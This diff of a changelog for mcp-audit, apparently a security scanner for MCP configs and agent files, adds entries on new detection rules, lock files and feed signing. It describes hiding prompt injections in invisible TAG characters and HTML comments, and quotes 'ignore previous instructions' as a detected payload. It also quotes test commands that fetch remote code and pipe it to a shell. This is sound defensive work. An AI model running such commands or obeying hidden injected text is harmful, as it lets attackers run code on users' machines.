+> `src/mcp_audit/lock/verifier.py`. The public GitHub Release body for v0.17.0 was corrected to
+> match. Nothing in the shipped code changed.
+
+### Added
+
+- **`mcp-audit lock` / `lock --verify` — a committable, reviewable record of exactly which MCP
+  servers your team approved (STORY-0069, EPIC-0006).** `mcp-audit lock` writes `mcp-lock.json`:
+  one entry per server, keyed `<client>/<name>`, covering identity, transport, resolved version
+  and how it was resolved, and an owned-section checksum (RFC 8785 canonical bytes) that changes
+  only when the fields mcp-audit owns change. `lock --verify` re-derives that checksum against the
+  current config and reports drift as new findings **LOCK-001** (identity/env/header drift since
+  locking, HIGH), **LOCK-002** (server present in config but missing from the lock, HIGH),
+  **LOCK-003** (locked server no longer present, MEDIUM; alone, it never fails the exit code),
+  **LOCK-004** (opt-in `--resolve` only, network: resolved version changed since locking, HIGH; or
+  the *same* resolved version now hashes differently — a republished artifact — CRITICAL),
+  **LOCK-005** (the lock file's own checksum over the fields mcp-audit owns does not match its
+  stored value — hand-edited or tampered, CRITICAL). LOCK-005 always short-circuits: once it fires,
+  no other LOCK id is evaluated and the run exits 2, the same exit code as a missing lock file. A
+  locked entry whose version was never resolved (recorded `--offline`) is a distinct, non-finding
+  condition — it never manufactures a LOCK id; it surfaces as a `WARN` line in `lock --verify`,
+  `check`, and `scan` output (and `unresolved_entries` in JSON), so a clean, `findings: 0` result can
+  never be read as "every entry's version was confirmed." Verification is offline by
+  default — comparing the lock against the config only, so registry movement cannot fail a build;
+  `--resolve` opts into network re-resolution under its own finding id and exit condition, never
+  merged with config drift, so a red CI job always says which one it is. The file reserves a
+  `trees` section for Prachet Poddar's independently-owned dependency-tree generator (format
+  convergence, ratified 2026-09-10) — mcp-audit never writes it, never validates it (that needs a
+  real package-manager install this tool will never perform), and preserves it byte-for-byte;
+  `trees` validation is a documented external command, not an in-repo path.
+  `generated_at` lives outside the checksummed body (a re-lock with no real change stays
+  byte-identical, which is the property a diff-reviewed format is bought for); `resolved_at`
+  changes only when a resolved version actually changes, so a routine re-lock doesn't churn every
+  entry's timestamp. See [`docs/lock.md`](docs/lock.md) and
+  [ADR-0005](docs/decisions/ADR-0005-mcp-audit-lock.md) for the full design, including the four
+  MUSTs (section provenance, byte preservation, unknown-section preservation, and a verifier that
+  states what it checked instead of implying it checked everything).
+
+- **The lock is now part of the everyday commands (STORY-0070).** `mcp-audit fix --fix-type pinning`
+  writes the exact locked version into your config (`npx -y foo` → `npx -y foo@1.4.2`), giving
+  `VULN-UNPINNED` its first remediation — no network call when a lock already has the resolved
+  version. `check` and `scan` verify `mcp-lock.json` automatically when present (`--no-lock` to
+  skip); LOCK findings are the one deliberate exception to "post-scan additions don't affect the
+  grade" — they do. The GitHub Action gains `lock-verify` / `lock-resolve`; a new
+  `mcp-audit-lock-verify` pre-commit hook blocks commits that drift from the lock, safe to enable
+  before you've ever run `mcp-audit lock` (a new `--if-present` flag on `lock --verify` makes a
+  missing lock file a no-op, not a failure). `mcp-lock.json`-aware `diff` output is tracked as a
+  follow-up, not included here. See [`docs/lock.md`](docs/lock.md) and the STORY-0070 addendum in
+  [ADR-0005](docs/decisions/ADR-0005-mcp-audit-lock.md).
+
+### Deferred
+
+- **STORY-0071 (org allowlist interop, P2) dropped from this tag.** Evaluating configs against the
+  GitHub Copilot / Claude Code / VS Code `allowedMcpServers` convergence, and exporting one from the
+  lock, needs matcher semantics verified against each vendor's *current* docs plus a new finding id
+  with its own fixtures and OWASP mapping — larger than its "S" sizing once scoped, the same shape
+  STORY-0070's own `diff` half was split out for. Per the story's explicit P2/drop allowance, it
+  stays in `backlog/ready/` rather than shipping rushed. `mcp-lock.json`-aware `diff` output
+  (STORY-0070's own deferred half) also remains a tracked follow-up.
+
+---
+
+## [0.16.0] - 2026-09-09
+
+### Added
+
+- **POISON-041/POISON-042 — concealment channels: hidden markup, decode-then-rescan.** Fixes a real annihilation bug in `normalize_for_detection()`: TAG characters (U+E0000–U+E007F, ASCII-smuggling research — Rehberger/Embrace The Red 2024) are category `Cf`, the same category the existing zero-width-splitting defence correctly strips — but stripping a *payload* instead of decoding it destroys the evidence rather than revealing it. Measured: a 28-character TAG-encoded "ignore previous instructions" payload decoded to the empty string under the unmodified pipeline, and the one rule that looks for invisible characters (POISON-040) does not match TAG characters at all — a clean scan on a live hidden payload, the worst output a scanner can produce. Fix is extract-then-rescan, never decode-in-place (splicing decoded text back into the original string would shift offsets and could manufacture a match that exists in neither the payload nor its neighbours): `extract_concealed_channels()` pulls every contiguous TAG-character run and every `<!-- ... -->` HTML comment out of the text into its own string; `scan_concealed_channels()` decodes/extracts each one and reruns the existing `PATTERNS` list against it as an independent pass, leaving the main normalize-and-match pass over the original text completely untouched (the regression test for this — a zero-width space still splitting and folding "ign\<zwsp\>ore previous instructions" back to a POISON-012 match — was written before the change, per the design doc's own instruction). Two-tier severity, deliberately asymmetric between the two channel kinds: **POISON-041** (HIGH) fires when a channel's decoded/extracted content matches an existing PATTERNS entry, on either kind. **POISON-042** (LOW) fires for TAG characters alone with no matched payload — their now-deprecated language-tagging purpose gives them essentially no legitimate use, so bare presence is itself anomalous — but deliberately **not** for a bare HTML comment: ordinary editorial comments (`<!-- TODO: ... -->`) are common and legitimate in Markdown, so an HTML comment stays completely silent unless its content actually matches a pattern, the same narrow-default-over-broad choice this project made for STDIO-002a's hidden leaf and TRUST-002's escaping symlink. Evidence is a documented exception to this module's "evidence shows the attacker's original bytes" rule: a TAG payload's original bytes render as nothing, so evidence instead shows the decoded/extracted ASCII content, explicitly labelled ("Decoded from N TAG character(s) (U+xxxx-U+xxxx): '...'" / "Extracted from an HTML comment (N chars): '...'"). One implementation site: `scan_concealed_channels()`/`build_concealment_finding()` live in `analyzers/poisoning.py` and are called unchanged by both the config surface (`PoisoningAnalyzer`) and the agent-file surface (`agent_files/analyzer.py`, both skill and memory files) — both findings therefore carry `analyzer="poisoning"` even when produced from a `SKILL.md` or `CLAUDE.md`, a deliberate, documented exception to `agent_files/analyzer.py`'s usual `analyzer="agent_files"`, matching how `discovery.py`'s shared symlink-finding builders already keep `analyzer="discovery"` regardless of which of the two `discovery.py` modules calls them. No new YAML rule: the engine has no decode primitive, so a YAML rule for the TAG case could never fire; a YAML rule for the HTML-comment-only case was declined for the same false-positive reason POISON-042 excludes it. No `mcp-audit fix` strategy — out of scope for this story, tracked in `GAPS.md`. HTML-comment extraction found and fixed its own bug before shipping: the first implementation (`<!--(.*?)-->` with `re.DOTALL`) rescans to the end of the string from every unclosed `<!--` opener, an O(n²) blowup measured at ~8s on an 80,000-character adversarial string; replaced with a two-pointer `str.find()` walk that never revisits scanned text (~2ms at 160,000 characters) — see `GAPS.md`. See `humans/decisions/2026-09-09-poison-041-design.md` (marcus repo).
+
+- **STDIO-001/STDIO-002a/STDIO-002b — launch-command trust boundary.** Three new community rules (`rules/community/`), amending epic decision #1: the epic originally scoped STDIO-002 to also detect a launcher path resolving outside the scanned repository, but the rule engine's `MatchField` vocabulary has no notion of a project or scan root (`grep -n "project_root\|scan_root" src/mcp_audit/rules/engine.py` returns zero), and the criterion was independently a bad one — every ordinary launcher (`npx`, `node`, a `~/.nvm/...` shim) resolves outside the project, so it would have fired on nearly every server on every machine for no signal; dropped rather than relocated into Python (see `GAPS.md`). **STDIO-002a** (HIGH, default-on) fires when `command`'s final path component — the binary itself, not merely a containing directory — begins with a dot; toolchains hide a *directory* (`~/.nvm/`, `node_modules/.bin/`) but never the binary at the end of it, and this is the exact shape of the "Deadbugz" MCP supply-chain campaign (Pillar Security, disclosed 2026-08-12; four of 23 GitHub pull requests it opened configured a local server at `~/.config/.cache/.sys/.deadbug-mcp.py`, copied verbatim from the public write-up, not invented). POSIX-only signal by design — dot-hiding contributes nothing on Windows. **STDIO-002b** (HIGH, default-on) fires when `command` is a known interpreter (`python`, `node`, `bash`, `sh`, `pwsh`, etc.) invoked with an inline-code flag (`-c`, `-e`, `--eval`, `-Command`); deliberately boundaried against COMM-015 (shell metacharacters in `args`) rather than duplicating it — COMM-015 owns the metacharacter class, STDIO-002b owns the inline-code flag shape whether or not metacharacters are also present, proven by a test asserting `python -c "exec(__import__('urllib.request').urlopen('http://x').read())"` (metacharacter-free) fires STDIO-002b and not COMM-015, while `sh -c "curl x | sh"` fires both, once each. **STDIO-001** (MEDIUM, policy-gated) fires when `command`'s basename is outside a small allowlist of well-known launchers derived from this project's own demo/fixture corpus; ships `enabled: false` because an allowlist rule fires on every legitimate custom launcher, and — verified rather than assumed, per the design doc's own stop-and-report instruction — there is currently no governance-policy mechanism anywhere in the codebase that can enable a disabled community rule (`grep -rn "enabled" src/mcp_audit/governance/` returns zero matches), so building that toggle was deliberately left out of this story rather than shipped enabled or half-wired (see `GAPS.md`). `scripts/validate_owasp_mapping.py`'s community-rule-ID scanner was widened from a `COMM-\d{3}`-only regex to any `PREFIX-suffix` shape so it can audit these (and any future) non-`COMM-` rule IDs. `rules/community/` grows from 34 to 37 files (36 real rules + `TEMPLATE.yml`). See `humans/decisions/2026-09-09-stdio-001-002-design.md` (marcus repo).
+
+- **CRED-003 — literal secrets in authentication headers.** `CredentialsAnalyzer` now checks `server.headers` directly: when a header key is one of the seven names in `AUTH_HEADER_NAMES` (`Authorization`, `x-api-key`, `api-key`, `x-auth-token`, `x-access-token`, `api_key`, `token` — moved from `analyzers/auth.py` to a shared, imported-not-copied constant, so a name that suppresses AUTH-001 can never silently miss CRED-003 under a different key) and its value is a literal rather than an environment reference, CRED-003 fires HIGH. This is deliberately key-driven rather than value-driven: `SECRET_PATTERNS` is provider-shaped (`AKIA…`, `ghp_…`, `sk-…`) plus one quoted `key: "value"` generic pattern, and an opaque bearer token or raw JWT (`Bearer eyJhbGci…`) matches none of it — a `SECRET_PATTERNS`-based CRED-003 would report clean on the exact shape the story exists to catch. The "correct form" check is a full-string match, not `_is_env_reference()`'s substring `.search()`: a recognised scheme prefix (`Bearer `, `Basic `, `Token `, or none at all) must be followed *entirely* by a single `${VAR}`/`$VAR`/`%VAR%` reference, so `"Bearer sk-live-abc$FOO"` still fires instead of being waved through by the trailing `$FOO`. An obvious placeholder (`<your-token>`, `REPLACE_ME`, `changeme`, `xxx…`, empty) fires INFO instead of HIGH — template configs are the most-copied configs in the ecosystem, and a HIGH there is the false positive that gets a rule switched off. A header key *not* in `AUTH_HEADER_NAMES` whose value still matches a `SECRET_PATTERNS` provider pattern also fires (e.g. `X-Custom-Thing: ghp_…`) — the one place value-matching earns its keep here. Fires on any transport, not just remote (AUTH-001 stays remote-only correctly; a literal token in a config file on disk is exposed whether or not the transport ever sends it, and a stdio server can carry a stale `headers` block). AUTH-001 stays suppressed when CRED-003 fires — authentication *is* configured; CRED-003 is about how the value is stored, not whether the header is present. Evidence carries only the header name, never the value, so nothing here can leak a live credential into a published advisory (`advisory/classify.py` maps CRED-003 to the same `hardcoded-secret` class as CRED-001/002). `mcp-audit fix --apply` remediates it (`fixer/strategies/credentials.py`) by replacing the value with a synthesised `${HEADER_NAME}` placeholder while preserving any existing scheme prefix. See `humans/decisions/2026-09-08-cred-003-design.md` (marcus repo).
+
+- **TRUST-002/TRUST-004/TRUST-005 — symlinked config and agent-file candidates are reported, not silently skipped.** Nine discovery sites (six in `discovery.py`, three in `agent_files/discovery.py`) used to `continue` past a symlinked candidate with no output at all — including `--path <symlink>`, a plain bug where a user's own explicit request produced silence. All nine now include the candidate (parsed normally; `Path.read_text()` follows a symlink transparently, so coverage was never actually traded away) and report it. Severity separates two harms that were previously one skip: **TRUST-002** (HIGH/MEDIUM/INFO) fires for a project- or cwd-scoped candidate — HIGH when the resolved target falls outside the scanned root (the GhostApproval shape: a reviewed, git-committed path is a decoy for content that lives elsewhere, e.g. `.mcp.json -> ~/.ssh/authorized_keys`), MEDIUM when it resolves inside, INFO when the link is broken; **TRUST-004** (always INFO) fires for a user-global known-client config or an explicit `--path` — this is exactly how dotfile managers (GNU Stow, chezmoi, yadm, dotbot) manage `~/.claude.json`, `~/.cursor/mcp.json`, etc., so it must never read as an accusation; **TRUST-005** (always LOW) fires when a symlinked *directory* is encountered during a tree walk — mcp-audit still never follows it (unchanged loop/blow-up protection), but the refusal is now audible instead of silent. See `humans/decisions/2026-09-08-trust-002-symlink-sites.md` (marcus repo) for the full evasion/escape design and the nine-site matrix.
+
+- **`.claude/skills/` — Claude Code skills directory, previously tracked as unconfirmed in GAPS.md, is now a confirmed agent-file surface.** `~/.claude/skills/**/SKILL.md` and `.claude/skills/**/SKILL.md` are discovered (any nesting depth, matched via a new recursive `"**"` segment in `agent_files/discovery.py`'s pattern resolver) under the `claude-code-skills` surface key and run through the existing SKILL-001/002/003 poisoning checks. New **SKILL-004** (INFO): inventories (filenames only, never contents, never executed) a skill's bundled `scripts/` subdirectory when one exists.
+
+- **`.amazonq/mcp.json` — Amazon Q Developer project-level MCP config.** Added to `_PROJECT_CONFIG_SPECS`; same `mcpServers` schema as Claude Code/Cursor, per AWS official docs. `scan --project` now emits TRUST-001 for Amazon Q servers the same way it already does for the other six confirmed clients.
+
+- **TRUST-003 — repo-planted IDE auto-execution.** `scan --project` now flags `.vscode/tasks.json` tasks that run on folder open and command-bearing `.vscode/settings.json` keys, quoting the command that would run; escalated to CRITICAL when it reaches the network. HOOK-002 now recognises hooks that rewrite `.claude/settings.json`, `.claude/settings.local.json`, or `.vscode/tasks.json`. This closes the half of the Keyv npm worm / Shai-Hulud "V.A.P.E" (2026) file layout mcp-audit did not see — the two config files are cross-wired by the real campaign (each invokes a script inside the other's directory) specifically so that a developer merely opening the folder, not running `npm install`, is enough to trigger it.
+
+- **Generalized the registry under-declaration predicate and added a tag-only-capability audit (R35).** `find_undeclared_capabilities()` (R34) tested `declared < inferred` (strict subset), which misses the partial-overlap case — an entry that declares something the heuristics don't infer AND omits something they do; those sets are incomparable under `<`, so the entry passed silently. Generalized to `inferred - declared` non-empty (subsumes strict subset); each hit is now tagged `"subset"` or `"disjoint"` so the two shapes stay distinguishable in the report. Measured before adopting per the task's own rule: re-run against all 50 live entries found exactly one new (disjoint) hit beyond the zero the strict form found, and it was real — adopted outright, no reviewed-exception mechanism (there is no legitimate-narrowing case in the data to design one against). Two real under-declarations were found and fixed across the two measurement passes: `@palisadeemail/mcp` (missing `email`; its own `tags` already say so) and `@azure/mcp` (missing `cloud`; its own `tags` already say so) — `entry_count` unchanged (50). Added `find_dead_capabilities()`: a `Capability` that appears in no `TOXIC_PAIRS` entry and no `attack_paths.CAPABILITY_FLOWS` edge is recordable but can never contribute to a finding, the `subprocess` defect's shape arriving through design instead of a typo. Compared against a new, mandatory-reason allowlist, `toxic_flow.KNOWN_TAG_ONLY_CAPABILITIES` (`TagOnlyCapability(capability, kind, reason)`, `kind` is `DELIBERATE_DEFERRAL` or `SUSPECTED_GAP`), so the next tag-only addition is a conscious act. Found `Capability.CLOUD` as expected (`DELIBERATE_DEFERRAL`, per R34) and, unexpectedly, `Capability.FILE_WRITE` (`SUSPECTED_GAP` — every toxic-pair/flow entry models one axis, confidentiality/exfiltration, and never asks whether state can change or a change can persist and later re-execute; `FILE_WRITE`'s wiring is deliberately **not** designed in this release and is queued as its own measure-first prompt, R37). `tests/test_toxic_flow.py::TestComputeDeadCapabilities` asserts zero unexpected tag-only capabilities on every PR, not just ones touching the registry file or `scripts/audit_registry.py` (a capability-table change lives entirely in `toxic_flow.py`/`attack_paths.py` and would not otherwise trigger `registry-drift.yml`). Added `find_entirely_tag_only_entries()`: flags any registry entry whose entire declared capability set is tag-only (zero hits today), proven empirically rather than argued — `TestCloudOnlyEntryYieldsNoToxicFlowFindings` builds a registry entry declaring only `["cloud"]` and asserts `ToxicFlowAnalyzer` returns no findings for it. Also added `_assert_mcp_audit_is_repo_local()`, called at the top of `scripts/audit_registry.py`'s `main()`: fails loudly (exit 2, naming the resolved path) if the importable `mcp_audit` is not this repo's dev source tree — discovered because the first R35 measurement pass silently ran against a stale, separately pip-installed `mcp_audit` (bare `python3` instead of `uv run python3`) that predated `CLOUD` and undercounted the real hits by one. Traced the R34 `subprocess` defect's provenance: all three offending entries were added in a single commit (`96f8210`, 2026-06-13) whose message documents CVE additions but never mentions `capabilities`; no doc, template, or `CLAUDE.md` revision at any point in the repo's history ever suggested `"subprocess"` as a capability value, and the submission template (added the same day) never offered it as a checkbox either — invented at triage time, with no source, a process finding rather than a documentation one.
+- **Registry capability audit + registry-submission template reconciliation (R34).** `scripts/audit_registry.py` now runs two local, offline, unconditional checks before its network audit loop: (1) `find_undeclared_capabilities` flags any entry whose explicit `capabilities` list is a **strict subset** of what `toxic_flow.py`'s keyword heuristics alone would infer from the package name — the signature of an under-declared entry, since the registry-first override in `tag_server()` returns declared capabilities verbatim and skips heuristics entirely, so an incomplete list on a `verified` entry silently suppresses detection an *unverified* package with the same name would still trigger; (2) `find_unknown_capabilities` flags any capability string that is not a defined `Capability` enum member — deliberately asymmetric with `_is_known_cap()`'s own silent-drop-at-read-time behaviour (that silence is forward compatibility for a client reading a newer registry file; this script speaks for the maintainers validating their own data before it ships). Running (2) across all 50 entries found a real, live defect: three entries (`@mcpjam/inspector`, `gemini-mcp-tool`, `flowise`) declared `"subprocess"`, which is not a `Capability` value — `_is_known_cap()` had been silently dropping it, so `flowise`'s declared `network_out` alongside the intended-but-dropped `shell_exec` never once triggered `TOXIC-006` (CRITICAL) for anyone scanning it, despite `flowise` and `gemini-mcp-tool` independently carrying corroborating RCE CVEs (CVE-2025-59528; CVE-2026-0755 / GHSA-4h5r-5jm8-jxjm). Fixed by renaming `"subprocess"` → `"shell_exec"` in all three entries; `entry_count` unchanged (50). Check (1) found zero hits across all 50 entries. Added `Capability.CLOUD` (deliberately **tag-only** — recorded and inferable via a new `KEYWORD_RULES` entry, but not wired into `TOXIC_PAIRS` or `attack_paths.CAPABILITY_FLOWS`, since cloud-SDK calls are already `NETWORK_OUT` mechanically and calibrating dedicated severity/CWE pairs for cloud's distinct blast radius needs its own research pass) so `.github/ISSUE_TEMPLATE/registry-submission.yml`'s "Access cloud resources" checkbox — previously unrepresentable — has a home. The template's checkboxes now map 1:1 onto `Capability` members in both directions: "Persist data across sessions (memory)" (mapped to nothing; submitters are pointed at whichever of file/database/network already covers their actual persistence mechanism) and a redundant "Execute code" (merged into "Execute shell commands", both `SHELL_EXEC`) were dropped, and "Access git repositories" was added (`GIT` already existed in the enum but had no checkbox). The description line no longer implies verification happens only when a submitter leaves the checklist blank; it states the actual and now-documented precedence — capabilities are derived from the package's own source and documentation, and the checkboxes are a starting point for that review, not the record — mirrored in `docs/registry.md` next to the `verified` bar. `tests/test_registry_submission_template.py` pins the bijection so template/enum drift fails CI instead of shipping another unrepresentable checkbox.
+- **The published advisory feed is now signed with a real project key — the last piece Amendment 7 gated.** A human (Adam) generated a minisign key pair outside any AI coding tool and backed up the private half encrypted offline; the private half lives only in the `MCP_AUDIT_FEED_SIGNING_KEY` secret, scoped to a `feed-signing` GitHub environment whose deployment-branch-policy restricts it to `main` (confirmed with `gh api`, not just the repository settings UI). `.github/workflows/advisory-feed-publish.yml`'s `build` job (the only job with `environment: feed-signing`) writes the secret to a `chmod 600` file under `$RUNNER_TEMP` — never the checkout `publish`'s later `git add` walks — and passes it explicitly via `--key`, deliberately not through `$MCP_AUDIT_SIGNING_KEY` (the secret's name does not match that CLI env var by design, so there is nothing to collide). `build` then runs `mcp-audit feed verify` against its own signed output before uploading anything, so a bad signature fails the workflow rather than reaching the branch users fetch from. `publish` is unchanged: `contents: write`, no `environment:` declaration, no path to the secret. The public half is committed at `keys/mcp-audit-feed.pub` and bundled into the wheel and PyInstaller binary via a new `[tool.hatch.build.targets.wheel.force-include]` entry, so `mcp-audit feed verify --key-alt minisign` resolves it by default (via `bundled_public_key_path()`) whenever neither `--public-key` nor `$MCP_AUDIT_SIGNING_PUBKEY` is given — an explicit flag or env var still wins, and the default never applies to `cosign` or `--keyless` verification, which pin identity through their own mechanisms. `docs/advisory-feed.md`'s "Key custody and rotation" section, which had described the reversed cosign/well-known-URL plan since 2026-08-20, is rewritten to match; so are the stale "no project key exists yet" lines in `src/mcp_audit/cli/advise.py` and `src/mcp_audit/advisory/sign.py`'s module docstring. See `docs/decisions` (marcus repo) `2026-08-23-feed-signing-and-publishing.md` and `2026-08-23-signing-key-custody-recommendation.md`.
+- **The advisory feed now has a real, fetchable publish destination.** `.github/workflows/advisory-feed-publish.yml` previously uploaded the weekly unsigned feed to a GitHub Actions artifact — reachable only with repository access, gone after 30 days. It now commits to a dedicated orphan `feed` branch, fetchable by anyone at `https://raw.githubusercontent.com/adudley78/mcp-audit/feed/index.json`. The workflow is split into `build` (`contents: read`; writes the candidate feed and diffs it against the currently-published one) and `publish` (`contents: write`; only runs when `build` found a real change, so a republish of identical findings under a new timestamp makes no commit — `scripts/feed_diff.py` ignores the `published`/`modified` fields every build stamps fresh, which a byte-for-byte diff cannot). `snapshot_version` reads the live `feed` branch's `index.json` via `--previous-index` on every run, not a local file, so it stays monotonic across runs. Still unsigned — no `--sign`, no key, no secret; see `docs/advisory-feed.md`. See `humans/decisions/2026-08-23-feed-signing-and-publishing.md` in the `marcus` repo.
+
+### Fixed
+
+- **A comment posted on [#35](https://github.com/adudley78/mcp-audit/issues/35) (docpull registry submission) misdescribed the merged entry's capabilities (R34).** The comment said the entry recorded "network-fetch and session-persistence capabilities with no filesystem, shell, or credential access"; the merged entry actually carries `["network_out", "file_write"]` — the sentence denied a capability the entry has, and named one (`session-persistence`) that is not in the capability vocabulary at all. Root cause: the sentence was written from the submission's checkboxes instead of the entry that actually merged. The entry itself was never wrong — its `file_write` capability is correct (docpull writes `docpull.yaml`, lockfiles, and packs to disk) and was built from the submitter's free-text description and the package's README, not from the checkbox, which is the right precedence but had never been written down (fixed by this same release; see the registry-submission-template entry above). Corrected [in a follow-up comment](https://github.com/adudley78/mcp-audit/issues/35#issuecomment-5576721275) on the same issue; the entry itself required no change.
+- **The first real signed publish (2026-09-07T19:40:39Z, `snapshot_version` 4) shipped `index.json` without `index.json.sig`.** `sign_feed()` correctly signs the index and writes `index.json.sig` next to it in the candidate artifact — but `advisory-feed-publish.yml`'s `publish` job's "Replace the published feed content" step only ever copied `advisories/`, `osv/`, and `index.json` from the downloaded artifact, never the top-level `.sig` file sitting alongside `index.json` (advisory `.sig` files were unaffected — they live inside `advisories/`, which is copied wholesale with `cp -r`). Every advisory verified fine; `index.json` itself failed closed with "Missing signature artifact index.json.sig" on any client running `mcp-audit feed verify`. Caught by a disposable `experiment-r32-offline-feed-verify.yml` `unshare --net` proof against the live production feed before any real consumer fetched it — not by CI, which only ever exercised the candidate artifact directly, not the post-`publish` branch content. Fixed with one added `cp` line; `test_publish_copies_index_json_sig_alongside_index_json` pins the regression. Republished the same day (`snapshot_version` 5, `2026-09-07T20:00:37Z`) and re-ran the same `unshare --net` proof against the corrected bytes: all 24 artifacts (23 advisories + index) verify OK offline, and flipping one byte of a downloaded advisory still fails offline as expected. The experiment workflow was disposable by design and removed once its two runs (broken, then fixed) were captured.
+
+### Security
+
+- **`scan --project` silently skipped config-level checks (CFHYG-005, HOOK-001/002) on any project config file that declared zero MCP servers, affecting v0.12.0–v0.15.0 (introduced in `65b965d`, the commit that shipped `--project`/TRUST-001 itself).** `_apply_project_scan()` only invoked the static pipeline — and therefore its step-0 config-level checks, which run once per config file independent of server count in the default (non-project) scan — when `project_servers` was non-empty. A config file consisting solely of a `hooks` section with no `mcpServers` key (exactly the shape planted by the Keyv npm worm and Shai-Hulud "V.A.P.E" campaigns; see the TRUST-003 entry above) produced a clean `scan --project` result: no CFHYG-005, no HOOK-001/002, despite the same file firing correctly in a default scan. Discovered while adding TRUST-003's fixture-driven integration test. Fixed by running the static pipeline unconditionally whenever at least one project config file is discovered, regardless of server count; `test_project_scan_fires_config_checks_when_no_mcp_servers_present` pins the regression.
 - **`main` now has branch protection; the `pypi` deployment environment now has a branch/tag restriction. Both were previously conventions enforced by nobody.** `gh api` showed `main` with no branch protection at all (404) and the `pypi` environment with no protection rules and no branch restriction — while `release.yml` described that environment in a comment as "defence in depth against a forked workflow trying to impersonate the release pipeline." The control existed in the comment, not in the settings; this is the precondition the recommended signing-key custody model depends on (an environment secret restricted to `main` means nothing if anything can reach `main`). Enforced now: `main` requires 14 named status checks from `ci.yml` to pass (branches must be up to date) and blocks force-pushes and branch deletion; PR reviews, signed commits, and admin enforcement were deliberately left off — Adam self-merges, and admin enforcement is off so a wrong required-check name has an escape hatch rather than blocking every PR. The `pypi` environment now has a deployment branch/tag policy restricting it to `main` and `v*.*.*` tags, matching how `publish-pypi` already only runs on a tag push; no required reviewers, since that job is fully automated and tag-triggered. Proved both directions before merging anything: a throwaway PR with a failing check was rejected by GitHub ("the base branch policy prohibits the merge"), and a `workflow_dispatch` dry-run of `release.yml` still built all four binaries and skipped `Publish to PyPI` exactly as before. See `humans/decisions/2026-08-23-signing-key-custody-recommendation.md` in the `marcus` repo.
 
 ### Docs
